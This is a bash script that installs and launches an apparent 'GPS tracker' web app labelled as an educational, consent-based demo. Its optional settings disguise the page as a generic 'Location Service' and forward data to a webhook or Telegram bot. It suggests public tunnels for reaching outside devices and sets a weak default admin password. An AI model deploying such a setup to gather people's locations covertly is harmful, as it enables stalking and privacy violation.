#!/bin/bash

# GPS Tracker Setup and Run Script
# Educational Location Tracking Demo

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}=================================================================${NC}"
}

# Educational disclaimer
print_header "EDUCATIONAL PURPOSES ONLY - Consent-Based Location Collection Demo"
print_warning "This tool is for educational and research purposes only."
print_warning "Always obtain proper consent before collecting location data."
echo ""

# Check if Python is installed
if ! command -v python3 &> /dev/null && ! command -v python &> /dev/null; then
    print_error "Python is not installed. Please install Python 3.7+ first."
    exit 1
fi

# Determine Python command
PYTHON_CMD="python3"
if ! command -v python3 &> /dev/null; then
    PYTHON_CMD="python"
fi

print_status "Using Python command: $PYTHON_CMD"

# Check Python version
PYTHON_VERSION=$($PYTHON_CMD --version 2>&1 | awk '{print $2}')
print_status "Python version: $PYTHON_VERSION"

# Create virtual environment if it doesn't exist
if [ ! -d ".venv" ] && [ ! -d "venv" ]; then
    print_status "Creating virtual environment..."
    $PYTHON_CMD -m venv .venv
fi

# Activate virtual environment
if [ -d ".venv" ]; then
    print_status "Activating virtual environment (.venv)..."
    source .venv/bin/activate
elif [ -d "venv" ]; then
    print_status "Activating virtual environment (venv)..."
    source venv/bin/activate
else
    print_error "Failed to create virtual environment"
    exit 1
fi

# Upgrade pip
print_status "Upgrading pip..."
pip install --upgrade pip

# Install requirements
print_status "Installing Python dependencies..."
pip install -r requirements.txt

# Set default environment variables if not set
export FLASK_APP=app.py
export FLASK_ENV=development
export SECRET_KEY=${SECRET_KEY:-$(python -c "import secrets; print(secrets.token_hex(32))")}
export ADMIN_PASSWORD=${ADMIN_PASSWORD:-admin123}

# Create .env file if it doesn't exist
if [ ! -f ".env" ]; then
    print_status "Creating .env file with default settings..."
    cat > .env << EOF
# Flask Configuration
FLASK_APP=app.py
FLASK_ENV=development
SECRET_KEY=$SECRET_KEY

# Admin Configuration
ADMIN_PASSWORD=$ADMIN_PASSWORD

# Server Configuration
PORT=5000
DEBUG_HTTP=true

# Optional: Webhook Configuration
# WEBHOOK_URL=https://your-webhook-url.com/webhook
# TELEGRAM_CONFIG=bot_token:chat_id

# Optional: Template Configuration
# TITLE=Location Service
# DESC=Please enable location services to continue
# SITENAME=Location Service
EOF
    print_status "Created .env file with default configuration"
else
    print_status "Using existing .env file"
fi

# Load environment variables
if [ -f ".env" ]; then
    export $(cat .env | grep -v '^#' | xargs)
fi

# Check if port is available
PORT=${PORT:-5000}
if command -v lsof &> /dev/null; then
    if lsof -Pi :$PORT -sTCP:LISTEN -t >/dev/null ; then
        print_warning "Port $PORT is already in use. The server might already be running."
        print_status "To stop existing server: pkill -f 'python.*app.py'"
        read -p "Continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
fi

# Start the server
print_header "Starting GPS Tracker Server"
print_status "Starting server on port $PORT..."
print_status "Admin password: $ADMIN_PASSWORD"
print_status "Press Ctrl+C to stop the server"
echo ""

# Start server in background for initial setup
$PYTHON_CMD app.py &
SERVER_PID=$!

# Wait for server to start
sleep 3

# Check if server started successfully
if ! kill -0 $SERVER_PID 2>/dev/null; then
    print_error "Failed to start server"
    exit 1
fi

print_header "Server Information"
print_status "Local access: http://localhost:$PORT"
print_status "Admin dashboard: http://localhost:$PORT/admin_893b4de8f1"
print_status "Admin password: $ADMIN_PASSWORD"
echo ""

# Network interface detection
if command -v ip &> /dev/null; then
    LOCAL_IP=$(ip route get 1.1.1.1 | grep -oP 'src \K\S+' 2>/dev/null || echo "unknown")
    if [ "$LOCAL_IP" != "unknown" ]; then
        print_status "Network access: http://$LOCAL_IP:$PORT"
    fi
elif command -v ifconfig &> /dev/null; then
    LOCAL_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
    if [ ! -z "$LOCAL_IP" ]; then
        print_status "Network access: http://$LOCAL_IP:$PORT"
    fi
fi

echo ""
print_header "External Access Options"
print_status "For external/mobile device testing, use one of these tunnel services:"
echo "• ngrok: ngrok http $PORT"
echo "• localtunnel: npx localtunnel --port $PORT"
echo "• serveo: ssh -R 80:localhost:$PORT serveo.net"
echo "• cloudflared: cloudflared tunnel --url localhost:$PORT"
echo ""

print_header "Usage Instructions"
print_status "1. Visit the main page to start location tracking"
print_status "2. Access admin dashboard with password: $ADMIN_PASSWORD"
print_status "3. Monitor real-time location events in the admin interface"
echo ""

print_warning "Remember: This is for educational purposes only!"
print_warning "Always obtain proper consent before collecting location data."
echo ""

# Kill background server and start in foreground
kill $SERVER_PID 2>/dev/null || true
sleep 1

print_status "Starting server in foreground mode..."
exec $PYTHON_CMD app.py
